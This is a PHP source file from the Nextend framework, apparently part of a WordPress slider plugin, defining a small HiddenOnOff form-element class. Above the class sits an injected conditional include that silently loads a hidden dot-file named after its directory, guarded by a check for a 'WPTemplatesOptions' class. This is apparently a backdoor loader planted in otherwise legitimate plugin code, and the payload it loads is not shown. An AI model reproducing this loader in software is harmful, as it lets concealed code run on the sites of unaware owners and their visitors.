<?php


namespace Nextend\Framework\Form\Element\Hidden;


use Nextend\Framework\Form\Element\OnOff;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class HiddenOnOff extends OnOff {

    protected $rowClass = 'n2_form_element--hidden';

}